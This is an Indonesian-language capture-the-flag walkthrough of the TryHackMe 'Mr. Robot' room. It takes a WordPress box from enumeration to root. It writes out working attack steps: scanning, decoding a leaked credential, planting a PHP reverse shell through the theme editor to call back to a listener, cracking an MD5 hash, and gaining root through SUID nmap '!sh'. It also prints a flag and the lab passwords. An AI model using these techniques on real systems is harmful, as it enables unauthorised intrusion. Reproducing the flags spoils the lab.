## 📘 Mr. Robot TryHackMe – Walkthrough Lengkap

**Level:** Easy - Medium
**Platform:** [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)

---

# ✅ PART 1 – ENUMERATION 🕵️‍♂️

### 🎯 Target:

Mendapatkan akses awal ke mesin dan menemukan `key-1-of-3.txt`.

---

## 🧾 1. Inisialisasi

* **IP Mesin:** `10.10.11.154` *(Contoh — sesuaikan dengan IP asli dari TryHackMe)*
* Pastikan sudah terhubung ke VPN TryHackMe
* Tools yang digunakan: `nmap`, `gobuster`, `curl`, `wget`, `base64`

---

## 🔍 2. Nmap Scan

Lakukan full scan untuk semua port:

```bash
nmap -sS -sV -T4 -Pn -p- 10.10.11.154
```

📌 **Hasil penting:**

* Port 22: SSH
* Port 80: HTTP
* Port 443: HTTPS

---

## 🦾 3. Enumerasi Direktori dengan Gobuster

Gunakan `gobuster` untuk menemukan direktori tersembunyi:

```bash
gobuster dir -u http://10.10.11.154 -w /usr/share/wordlists/dirb/common.txt
```

📌 **Ditemukan antara lain:**

* `/robots.txt`
* `/license`
* `/wp-login.php`

---

## 📄 4. Cek robots.txt

Download konten `robots.txt`:

```bash
curl http://10.10.11.154/robots.txt
```

📥 Output:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

✅ **Unduh file yang disebutkan:**

```bash
wget http://10.10.11.154/fsocity.dic
wget http://10.10.11.154/key-1-of-3.txt
```

---

## 🗝️ 5. Flag Pertama: key-1-of-3.txt

Cek isi filenya:

```bash
cat key-1-of-3.txt
```

📌 Output:

```
073403c8a58a1f80d943455fb30724b9
```

---

## 📄 6. Cek `/license` – Berisi User dan Password (Base64)

Setelah melakukan enumerasi direktori menggunakan `gobuster`, ditemukan file:

```
http://10.10.11.154/license
```

📥 Isinya (dalam Base64):

```text
ZWxsaW90OkVSMjgtMDY1Mg==
```

🔓 Decode menggunakan:

```bash
echo ZWxsaW90OkVSMjgtMDY1Mg== | base64 -d
```

📌 Output:

```
elliot:ER28-0652
```

Jadi kita mendapatkan kredensial login WordPress langsung dari file ini:

* **Username:** elliot
* **Password:** ER28-0652

---

## 🔐 7. Login ke WordPress

Akses halaman login WordPress:

```
http://10.10.11.154/wp-login.php
```

Gunakan kredensial hasil decode:

* **Username:** elliot
* **Password:** ER28-0652

✅ Setelah login berhasil, kita bisa lanjut eksploitasi.

---

## 💣 8. Upload Reverse Shell via Theme Editor

Setelah login ke dashboard WordPress:

1. Buka menu **Appearance > Theme Editor**
2. Pilih file `404.php`
3. Ganti seluruh isi file dengan [PHP reverse shell dari pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
4. Ubah IP dan port kamu di baris berikut:

```php
$ip = 'YOUR_TUN0_IP';
$port = 4444;
```

✅ Simpan perubahan.

---

## 📡 9. Jalankan Netcat Listener

Di terminal kamu:

```bash
nc -lvnp 4444
```

Lalu akses file:

```
http://10.10.11.154/404.php
```

🎉 Boom! Reverse shell sebagai user `www-data` akan terbuka.

---

## 🛠️ 10. Stabilkan Shell (Opsional)

Untuk kenyamanan, stabilkan shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

# ✅ PART 2 – USER PRIVILEGE ESCALATION 🧗‍♂️

### 🎯 Target:

* Dapatkan akses ke user `robot`
* Ambil `key-2-of-3.txt`

---

## 🔍 1. Cari User-User yang Ada di Sistem

Dari reverse shell kamu, cek isi `/home/`:

```bash
ls /home/
```

📌 Output:

```
robot
```

➡️ Artinya ada user bernama `robot`. Kita akan coba masuk ke akunnya.

---

## 🔍 2. Cek Isi Home User `robot`

```bash
ls -la /home/robot
```

📌 Output:

```
-r-------- 1 robot robot 33 Nov 13 2019 key-2-of-3.txt
-r-x------ 1 robot robot 39 Nov 13 2019 password.raw-md5
```

⚠️ Kita belum bisa baca `key-2-of-3.txt` karena sekarang kita masih user `www-data`.

Tapi kita bisa akses file `password.raw-md5`. Ambil dulu:

```bash
cat /home/robot/password.raw-md5
```

📌 Output:

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Itu adalah **hash MD5**.

---

## 🔓 3. Crack Password Hash MD5

Gunakan CrackStation.net atau John The Ripper untuk crack hash:

📌 Pakai [https://crackstation.net](https://crackstation.net) dan masukkan:

```
c3fcd3d76192e4007dfb496cca67e13b
```

🔑 Hasil:

```
abcdefghijklmnopqrstuvwxyz
```

---

## 🔐 4. Login sebagai User `robot`

Kita tahu password-nya, jadi:

```bash
su robot
```

Saat diminta password, ketik:

```
abcdefghijklmnopqrstuvwxyz
```

---

✅ Kamu sekarang jadi user `robot` 🎉

Cek dengan:

```bash
whoami
```

Output:

```
robot
```

---

## 📁 5. Ambil Flag Kedua

```bash
cat /home/robot/key-2-of-3.txt
```

🎉 Flag kedua berhasil diambil!


---


# ✅ PART 3 – ROOT PRIVILEGE ESCALATION & FINAL FLAG 👑

### 🎯 Target:

* Escalate dari user `robot` menjadi `root`
* Ambil `key-3-of-3.txt`

---

## 🔎 1. Cek Hak Akses `sudo`

Pertama coba:

```bash
sudo -l
```

📌 Output:

```
robot is not in the sudoers file. This incident will be reported.
```

➡️ Artinya kita gak bisa pakai `sudo`. Gak masalah. Kita cari cara lain pakai **SUID** exploit.

---

## 🧰 2. Cari File SUID

SUID = file yang dijalankan dengan **hak akses owner** (biasanya root)

```bash
find / -perm -4000 -type f 2>/dev/null
```

📌 Output (cuplikan penting):

```
/usr/local/bin/nmap
```

❗ Ini menarik karena biasanya `nmap` tidak berada di `/usr/local/bin`. Kita cek apakah dia punya SUID:

```bash
ls -la /usr/local/bin/nmap
```

Output:

```
-rwsr-xr-x 1 root root 123456 Jan 1 2020 /usr/local/bin/nmap
```

➡️ Yup! Huruf `s` di `rws` menunjukkan bahwa **nmap ini dijalankan sebagai root**.

---

## 🧨 3. Gunakan Nmap untuk Dapatkan Root Shell

Jalankan versi interaktif dari Nmap:

```bash
/usr/local/bin/nmap --interactive
```

Akan muncul prompt:

```
nmap>
```

Ketik:

```bash
!sh
```

🎉 BOOM! Sekarang kamu **root shell**!

---

## 🔓 4. Cek Status

```bash
whoami
```

📌 Output:

```
root
```

🚀 Kamu sekarang root! Saatnya ambil flag terakhir.

---

## 🏁 5. Ambil Flag Terakhir

```bash
cat /root/key-3-of-3.txt
```

🎉 Dan kamu berhasil mendapatkan:

```
THM{...flag content...}
```

---

# 🏆 Challenge Selesai!

---

## 🔚 Ringkasan Flag

| 🏴 Flag        | 📂 Lokasi         | 📝 Catatan                                |
| -------------- | ----------------- | ----------------------------------------- |
| key-1-of-3.txt | `/key-1-of-3.txt` | Ditemukan via `gobuster` dan `robots.txt` |
| key-2-of-3.txt | `/home/robot/`    | Perlu akses user `robot`                  |
| key-3-of-3.txt | `/root/`          | Perlu akses root (privilege escalation)   |

---

## ✅ Tools yang Digunakan

| 🛠️ Tools     | 🔍 Fungsi                                |
| ------------- | ---------------------------------------- |
| `nmap`        | Melakukan scan port dan service          |
| `gobuster`    | Enumerasi direktori tersembunyi          |
| `curl`/`wget` | Mendownload file dari server             |
| `base64`      | Decode string credential dari `/license` |
| `netcat`      | Reverse shell listener                   |
| `python`      | Stabilkan shell + privilege escalation   |
| `find`        | Mencari file dengan permission SUID      |

---

## 👨‍💻 Catatan Akhir

Challenge ini mengajarkan teknik-teknik penting seperti:

* 📁 **Web enumeration** menggunakan `gobuster`
* 🔐 **Credential harvesting** dari file Base64
* ⚙️ **Login WordPress dan reverse shell** via theme editor
* 🔑 **Privilege escalation** via binary SUID (`nmap`)
* 🧠 **Pentingnya observasi & eksplorasi file aneh seperti `/license`**



